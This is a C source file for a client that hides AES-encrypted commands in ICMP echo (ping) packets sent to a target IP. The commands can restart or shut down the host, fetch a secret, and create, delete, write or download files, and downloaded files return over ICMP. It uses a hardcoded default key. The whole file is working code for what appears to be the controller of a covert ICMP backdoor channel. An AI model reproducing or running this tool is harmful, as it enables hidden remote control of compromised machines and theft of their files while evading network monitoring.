#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <error.h>
#include <sys/types.h>          /* See NOTES */
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/icmp.h>
#include <linux/ip.h>
#include <linux/limits.h>
#include <netdb.h>
#include <getopt.h>
#include <errno.h>
#include <sys/time.h>
#include <time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <libgen.h>
#include "cmd.h"
#include "ctr.h"
#include "aes.h"


#define MIN_SIZE_BUF 64
#define ARRAY_SIZE(a) (sizeof(a)/sizeof((a)[0]))

/* socket type: SOCK_RAW, SOCK_DGRAM */
static int socket_type_raw = 1;
/* socket handle */
static int socket_fd = -1;

/* dest IP addr */
struct sockaddr_in addr;
char *dest_addr;

/* icmp id and sequence */
static short id = 1;
static short seq = 0;

/* send/recv buf and buf length */
static char *snd_buf = NULL;
static char *recv_buf = NULL;
static int snd_len = 0;
static int recv_len = 0;
static int buf_size = MIN_SIZE_BUF ;

/* cmd */
static short cmd = 0;

/* dest filename */
static char *filename = NULL;
/* dest file size */
static int filelen = 0;
/* file description and size */
static int g_w_fd = 0;
static int g_w_fd_size = 0;

static char default_key[] = "anquanyanjiu&890";
static char *key = default_key;


struct cmd_struct g_cmds[] = {
	{ CMD_RESTART, "restart" },
	{ CMD_SHUTDOWN, "shutdown" },
	{ CMD_SECRET,   "secret" },
	{ CMD_CREATE_FILE, "create" },
	{ CMD_DELETE_FILE, "delete" },
	{ CMD_WRITE_FILE, "write" },
	{ CMD_GET_FILE_SIZE, "getfilesize" },
	{ CMD_SEND_FILE, "getfile"},
};

static int print_hex(char *prefix, char *buf, int len, int rowsize, int split);

static void usage(FILE *f, char *prog)
{
	int code = 0;

	if (!f || !prog)
		goto end;
	if (f == stderr)
		code = -1;

	fprintf(f, "Usage:%s cmd [-s:][-k:] [-f:] [-l:] hostIP\n"
		   "cmd: restart | shutdown | secret | create | delete | write | getfilesize | getfile\n"
		   "-s: buf size, default 64 bytes\n"
                   "-k: hex secret key\n"
                   "-f: name of cmd 'getfilesize' or 'getfile'\n"
                   "-l: length of cmd 'getfile'\n", prog);
end:
	exit(code);
}

static struct option long_options[] = {
	{"size",     required_argument, 0,  's' },
	{"hexkey",      required_argument, 0,  'k' },
	{"filename", required_argument, 0,  'f' },
	{"filelen", required_argument, 0,   'l' },
	{0,         0,                 0,  0 }
};

static int parse_cmd(char *cmd_str)
{
	int i = 0;

	if (!cmd_str)
		return -1;
	for (i=0; i<ARRAY_SIZE(g_cmds); i++) {
		if (strcmp(g_cmds[i].name, cmd_str) == 0)
			return g_cmds[i].cmd;   
	}

	return -1;
}

static int parse_secret(char **key, char *hkey)
{
	char *tmp = NULL;
	int len = 0;
	int ch;
	int i = 0;
	int ret = -1;

	if (!hkey || !key)
		goto end;

	len = strlen(hkey);
	tmp = malloc(len/2+1);
	if (!tmp)
		goto end;
	
	for (i=0; i<len/2; i++) {
		sscanf(hkey+i*2, "%02x", &ch);
		tmp[i] = (char)ch;
	}
	tmp[i] = '\0';

	*key = tmp;
//	print_hex("key:", *key, len/2, 32, 0);
	ret = 0;
end:
	return ret;
}

static int parse_opt(int argc, char **argv)
{
	int c;
	int ret = -1;
	char *prog = argv[0];

	cmd = parse_cmd(argv[1]);
	if (cmd <= 0)
		usage(stderr, prog);

	argc -= 1;
	argv += 1;
	while (1) {
		int option_index = 0;

		c = getopt_long(argc, argv, "s:k:f:l:",
				long_options, &option_index);
		if (c == -1)
			break;

		switch (c) {
		case 's':
			buf_size = strtol(optarg, NULL, 10);
			if (buf_size < MIN_SIZE_BUF)
				buf_size = MIN_SIZE_BUF; 
			break;

		case 'k':
			if (parse_secret(&key, optarg) < 0)
				usage(stderr, prog);
			if (!key || strlen(key) == 0)
				usage(stderr, prog);

			break;

		case 'f':
			filename = strdup(optarg);
			if (!filename)
				usage(stderr, prog);
			break;

		case 'l':
			filelen = strtol(optarg, NULL, 10);
			if (filelen <= 0)
				usage(stderr, prog);
			break;
		default:
			printf("?? getopt returned character code 0%o ??\n", c);
			break;
		}
	}

	if (optind < argc) 
		dest_addr = argv[optind];

	if (dest_addr && (cmd > 0 && cmd <= MAX_NUM_CMD)) {
		if (cmd == CMD_GET_FILE_SIZE  && !filename)
				usage(stderr, prog);
		if (cmd == CMD_SEND_FILE && (!filename || filelen <= 0))
				usage(stderr, prog);
		ret = 0;
	} else {
		usage(stderr, prog);
	}

	return ret;
}

static int icmp_socket_fd(void)
{
	struct protoent *proto = NULL;
	int fd = -1;

	proto = getprotobyname("icmp");
	if (!proto)
		goto end;

	errno = 0;
	fd = socket(AF_INET, SOCK_RAW, proto->p_proto);
	if (fd < 0) {
		if (errno == EPERM || errno == EACCES) {
			errno = 0;
			fd = socket(AF_INET, SOCK_DGRAM, proto->p_proto);
			if (fd < 0)
				goto end;
			socket_type_raw = 0;
		}
	}
	
end:
	if (proto)
		endprotoent();
	return fd;
}

static int set_sockopt(int fd)
{
	int opt = 1;
	int ttl = 255;
	struct icmp_filter filter = { .data = (1 << ICMP_ECHO) };
	struct timeval tv = {.tv_sec = 5};
	int ret = -1;
	
	errno = 0;
	if (setsockopt(fd, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt)) < 0) {
		perror("setsockopt SO_BROADCAST");
		goto end;
	}

	if (setsockopt(fd, IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl)) < 0) {
		perror("setsockopt IP_TTL");
		goto end;
	}

	if (socket_type_raw) {
		if (setsockopt(fd, IPPROTO_RAW, ICMP_FILTER, &filter, sizeof(filter)) < 0) {
			perror("setsockopt ICMP_FILTER");
			goto end;
		}
	}

	if (setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, (char *)&tv, sizeof(tv)) < 0) {
		perror("setsockopt SO_SNDTIMEO");
		goto end;
	}

        if (setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (char *)&tv, sizeof(tv)) < 0) {
		perror("setsockopt SO_RCVTIMEO");
		goto end;
	}

	ret = 0;

end:
	return ret;
}

static int init_buf(void)
{
	int ret = -1;

	snd_buf = malloc(buf_size);
	if (!snd_buf)
		goto end;
	snd_len = buf_size;

	recv_buf = malloc(buf_size+sizeof(struct iphdr));
	if (!recv_buf)
		goto end;
	recv_len = buf_size+sizeof(struct iphdr);
	ret = 0;
end:
	return ret;
}

static int init_addr(void)
{
	int ret = -1;

	addr.sin_family = AF_INET;
	addr.sin_port = htons(0);
	if (inet_aton(dest_addr, &addr.sin_addr) == 1)
		ret = 0;

	return ret;	
}

static int encode_data(char *dst, int dst_len, char *src, int src_len)
{
	int ret = -1;
	int len = 0;

	if (!dst || dst_len <= 0 || !src || src_len <= 0)
		goto end;

	len = dst_len > src_len ? src_len : dst_len;
	memcpy(dst, src, len);
	ret = len;

end:
	return ret; 
}

static int encode_timestamp(char *buf, int len)
{
	struct timeval tv;
	int r_len = 0;
	int ret = -1;
	
	if (!buf || len <= 0)
		goto end;

	gettimeofday(&tv, NULL);
	r_len = encode_data(buf, len, (char*)&tv, sizeof(tv));
	ret = r_len;
end:
	return ret; 
}

static int encode_cmd(char *buf, int len)
{
	char *data = NULL;
	short n_cmd = htons(cmd);
	int r_len = 0;
	int ret = -1;

	if (!buf || len < sizeof(struct timeval) + LEN_PREFIX_CMD)
		goto end;

	data = buf;
	r_len = encode_data(data, len, (char*)&n_cmd, sizeof(n_cmd));  
	if (r_len < 0)
		goto end;
	data += r_len;
	len -= r_len;

	if (cmd == CMD_GET_FILE_SIZE || cmd == CMD_SEND_FILE) {
		r_len = encode_data(data, len, filename, strlen(filename));  
		if (r_len < 0)
			goto end;
		data += r_len;
		len -= r_len;

		if (len <= 0)
			goto end;
		*data++ = '\0';
		len--;
	}
	ret = (data - buf);
end:
	return ret;
}

unsigned short icmp_cksum (unsigned char * addr, int len)
{ 
	register int sum = 0; 
	unsigned short answer = 0;
	unsigned short *wp;

	for (wp = (unsigned short *) addr; len > 1; wp++, len -= 2)
		sum += *wp;

	/* Take in an odd byte if present */
	if (len == 1)
	{
		*(unsigned char *) & answer = *(unsigned char *) wp;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xffff);   /* add high 16 to low 16 */
	sum += (sum >> 16);           /* add carry */
	answer = ~sum;                /* truncate to 16 bits */
	return answer;
}
   
static int encode_icmphdr(char *buf, int len, short id, short seq)
{
	struct icmphdr *icmp = NULL;
	int ret = -1;

	icmp = (struct icmphdr *)buf;
	if (!buf || len < sizeof(*icmp) + LEN_PREFIX_CMD)
		goto end;

	icmp->type = ICMP_ECHO;
	icmp->code = 0;
	icmp->checksum = 0;
	icmp->un.echo.sequence = htons (seq);
	icmp->un.echo.id = htons (id);

	icmp->checksum = icmp_cksum((unsigned char *)buf, len);
	ret = sizeof(*icmp);

end:
	return ret;
}

static int encode_icmp(char *buf, int len, short id, short seq)
{
	struct icmphdr *icmp = NULL;
	int ret = -1;
	int r_len = 0;

	r_len = encode_timestamp(buf+sizeof(*icmp), len-sizeof(*icmp));
	if (r_len < 0)
		goto end;

	if (encode_cmd(buf+sizeof(*icmp)+r_len, len-sizeof(*icmp)-r_len) < 0)
		goto end;

//	fprintf(stdout, "aes_encrypt_ctr len:%ld 1:%ld 2:%d\n",  len-sizeof(*icmp)-r_len, sizeof(*icmp), r_len);
	aes_encrypt_ctr(buf+sizeof(*icmp)+r_len, len-sizeof(*icmp)-r_len, key);

	if (encode_icmphdr(buf, len, id, seq) < 0)
		goto end;
	ret = len;

end:
	return ret;
}

static int decode_timestamp(struct timeval *tv, char *buf, int len)
{
	int ret = -1;

	if (!tv || !buf || len < sizeof(*tv))
		goto end;

	memcpy(tv, buf, sizeof(*tv));
	ret = sizeof(*tv);
end:
	return ret;
}


static int print_hex(char *prefix, char *buf, int len, int rowsize, int split)
{
	int i = 0;
	int ret = -1;

	if (!buf || len <= 0)
		goto end;

	if (rowsize < 0)
		rowsize = 16;

	if (prefix)
		fprintf(stdout, "%s", prefix);

	for (i=0; i<len; i++) {
		if (split)
			fprintf(stdout,"%02x ", (unsigned char)buf[i]);
		else
			fprintf(stdout,"%02x", (unsigned char)buf[i]);
		if ((i+1) % rowsize == 0)
			fprintf(stdout, "\n");
	}
	if ((i+1) % rowsize != 0)
		fprintf(stdout, "\n");
	ret = len;
end:
	return ret;
}

static int decode_secret(char *buf, int len)
{
	char *data = NULL;
	char *secret = NULL;
	int secret_len = -1;
	int ret = -1;

	if (!buf || len <= sizeof(secret_len))
		goto end;

	data = buf;
	secret_len = ntohl(*(int*)data);
	data += sizeof(secret_len);
	len -= sizeof(secret_len);
	if (len < secret_len) 
		goto end;
	
	secret = data;
	data += secret_len;
	len -= secret_len;
	print_hex("New secret:", secret, secret_len, 32, 0);
	ret = data - buf;
end:
	return ret;
}

static int decode_file_size(char *buf, int len)
{
	char *data = NULL;
	char *filename = NULL;
	int size_len = -1;
	long size = -1;
	int i = 0;
	int ret = -1;

	if (!buf || len <= 0)
		goto end;
		
	filename = data = buf;
	for (i=0; i<len; i++) {
		if (filename[i] == '\0') 
			break;
	} 
	if (i == len) {
		filename[i-1] = '\0';
		data += i;
		goto out;
	}
	data += (i+1);
	len -= (i+1);


	if (len < sizeof(size_len))
		goto out;
	size_len = ntohl(*(int*)data);
	data += sizeof(size_len);
	len  -= sizeof(size_len);

	if (len < size_len)
		goto out;
	size = *(long*)data;
	data += sizeof(size);
	len  -= sizeof(size);

out:
	ret = data - buf;
	fprintf(stdout, "file:%s size:%ld\n", filename, size);
end:
	return ret;
}

static int open_file(const char *filename)
{
	char path[PATH_MAX] = {0};

	snprintf(path, sizeof(path), "./%s", basename((char*)filename));

        return open(path, O_RDWR|O_TRUNC|O_CREAT, S_IRUSR|S_IWUSR);
}

static int write_to_file(char *buf, int len, const char *fname)
{
	int ret = -1;

        if (g_w_fd < 0)
                goto end;

	while (len > 0) {
		ret = write(g_w_fd, buf, len);
		if (ret < 0) {
			ret = -1;
			goto end;
		}
		g_w_fd_size += ret; 
		len -= ret;
	}
end:
        return ret;
}

static int decode_file(char *buf, int len)
{
	char *data = NULL;
	char *filename = NULL;
	int f_len = -1;

	int r_len = -1;
	int i = 0;
	int ret = -1;

	if (!buf || len <= 0)
		goto end;
		
	filename = data = buf;
	for (i=0; i<len; i++) {
		if (filename[i] == '\0') 
			break;
	} 
	if (i == len) {
		filename[i-1] = '\0';
//		fprintf(stdout, "file:%s\n", filename);
		data += i;
		goto out ;
	}
	data += (i+1);
	len -= (i+1);

//	fprintf(stdout, "file:%s\n", filename);
	if (len < sizeof(f_len))
		goto out;
	f_len = ntohl(*(int*)data);
	data += sizeof(f_len);
	len  -= sizeof(f_len);

	if (len < f_len)
		goto out;

//	r_len = print_hex(NULL, data, f_len);
	write_to_file(data, f_len, filename);
	data += r_len;
	len -= r_len;

out:
	ret = data - buf;
end:
	return ret;
}

static int decode_cmd(char *buf, int len)
{
	char *data = NULL;
	short cmd = 0;
	int r_len = 0;
	int ret = -1;

	if (!buf || len < sizeof(cmd))
		goto end;
		
	data = buf;
	cmd = ntohs(*(short*)data);
	if (cmd < 0 || cmd > MAX_NUM_CMD)
		goto end;
	data += sizeof(cmd);
	len -= sizeof(cmd);
//	fprintf(stdout, "cmd:%d ", cmd);

	switch (cmd) {
	case CMD_SECRET:
		r_len = decode_secret(data, len);
		data += r_len;
		len -= r_len;
		break;  

	case CMD_GET_FILE_SIZE:
		r_len = decode_file_size(data, len);
		data += r_len;
		len -= r_len;
		break;  

	case CMD_SEND_FILE:
		r_len = decode_file(data, len);
		data += r_len;
		len -= r_len;
		break;  
		
	default:
		break;
	}
	ret = data - buf;
end:
	return ret;
}

static int icmp_out(char *recv_buf, int recv_len, char *snd_buf, int snd_len, int verbose)
{
	struct iphdr *ip = NULL;
	struct icmphdr *icmp = NULL;
	struct icmphdr *icmp_orig = NULL;

	struct timeval tv;
	struct timeval tv_orig;
	char *buf = NULL;
	int len = 0;
	int r_len = 0;

	char time_buf[64] = {0};
	unsigned long cost = 0;
	static short last_seq = -1;
	int ret = -1;

	if (!recv_buf || recv_len < sizeof(*ip) + sizeof(*icmp) + LEN_PREFIX_CMD
			|| !snd_buf || snd_len < sizeof(*icmp_orig) + LEN_PREFIX_CMD)
		goto end;

	gettimeofday(&tv, NULL);

	/*
	 * Recv buf info
         */
	if (socket_type_raw) {
		ip = (struct iphdr *)recv_buf; 
		icmp = (struct icmphdr *)((char *)ip + sizeof(*ip));
		buf = recv_buf + sizeof(*ip) + sizeof(*icmp);
		len = recv_len - sizeof(*ip) - sizeof(*icmp);
	} else {
		icmp = (struct icmphdr *)recv_buf;
		buf = recv_buf + sizeof(*icmp);
		len = recv_len - sizeof(*icmp);
	}
	
	r_len = decode_timestamp(&tv_orig, buf, len); 
	if (r_len < 0) 
		goto end;

	if (verbose) {
		cost = tv.tv_sec*1000000 + tv.tv_usec - tv_orig.tv_sec*1000000 - tv_orig.tv_usec;

		strftime(time_buf, sizeof(time_buf), "%F %T", localtime(&tv.tv_sec));
		fprintf(stdout, "Recv icmp data_len:%d type:%d code:%d id:%d seq:%d time:%s:%ld, cost:%ld us\n",
				len, icmp->type, icmp->code, ntohs(icmp->un.echo.id),
				ntohs(icmp->un.echo.sequence), time_buf,
				tv.tv_usec, cost);
	}

	if (last_seq >= 0 && ((last_seq + 1) != ntohs(icmp->un.echo.sequence))) 
		fprintf(stderr, "Lost data, last seq:%d, curr seq:%d\n", last_seq, ntohs(icmp->un.echo.sequence));	
	last_seq = ntohs(icmp->un.echo.sequence);

	buf += r_len;
	len -= r_len;
	aes_decrypt_ctr(buf, len, key); 
	r_len = decode_cmd(buf, len);

	ret = 0;
end:
	return ret;
} 

static int recv_file_size(int fd)
{
	int len = -1;
	int ret = -1;

	fprintf(stdout, "Recv from %s ", dest_addr);

	errno = 0;
	len = recv(fd, recv_buf, recv_len, 0);
	if (len < 0) {
		perror("recv");
		ret = -1;
		goto end;
	}

	icmp_out(recv_buf, len, snd_buf, snd_len, 0); 
	ret = len;
end:
	return ret;
}

static int recv_file(int fd, int len)
{
	int size = 0;
	int ret = -1;

	g_w_fd = open_file(filename);
	if (g_w_fd < 0) {
		perror("open file");
		goto end;
	}

	fprintf(stdout, "Recv from %s file:%s, ", dest_addr, filename);
	g_w_fd_size = 0;
	while (g_w_fd_size < len) {
		errno = 0;
		ret = recv(fd, recv_buf, recv_len, 0);
		if (ret < 0) {
			if (errno == EAGAIN || errno == EWOULDBLOCK)
				continue;
			perror("recv");
			goto end;
		}

		icmp_out(recv_buf, ret, snd_buf, snd_len, 0); 
		size += ret;
	}

	fprintf(stdout, "Succ recv total size %d\n", g_w_fd_size);
	g_w_fd_size = 0;
	close(g_w_fd);
end:
	return (ret = size);
}

static int recv_secret(int fd)
{
	int len = -1;
	int ret = -1;

	fprintf(stdout, "Recv from %s ", dest_addr);
	errno = 0;
	len = recv(fd, recv_buf, recv_len, 0);
	if (len < 0) {
		perror("recv");
		ret = -1;
		goto end;
	}

	icmp_out(recv_buf, len, snd_buf, snd_len, 0); 
	ret = len;
end:
	return ret;
}

int main(int argc, char **argv)
{
	int len = -1;
	int ret = -1;
	if (argc <= 2)
		usage(stderr, argv[0]);

	parse_opt(argc, argv);

	socket_fd = icmp_socket_fd();
	if (socket_fd < 0) {
		perror("socket fd");
		goto end;
	}

	ret = set_sockopt(socket_fd);
	if (ret < 0) {
		perror("set_sockopt");
		goto end;
	}

	ret = init_buf();
	if (ret < 0)
		goto end;

	ret = init_addr();
	if (ret < 0)
		goto end;

	if (encode_icmp(snd_buf, snd_len, id++, seq++) < 0)
		goto end;

	len = sendto(socket_fd, snd_buf, snd_len, 0, (struct sockaddr *)&addr, sizeof(addr));
	if (len < 0) {
		perror("sendto");
		ret = -1;
		goto end;
	}

	switch (cmd) { 
	case CMD_SECRET:
		recv_secret(socket_fd);
		break;
	case CMD_GET_FILE_SIZE:
		recv_file_size(socket_fd);
		break;
	case CMD_SEND_FILE:
		recv_file(socket_fd, filelen);
		break;
	default:
		break;
	}

	ret = 0;

end:
	if (recv_buf) {
		free(recv_buf);
		recv_buf = NULL;
	}
	if (snd_buf) {
		free(snd_buf);
		snd_buf = NULL;
	}
	if (filename) {
		free(filename);
		filename = NULL;
	}
	if (key != default_key) {
		free(key);
		key = default_key;
	}
	return ret; 
}
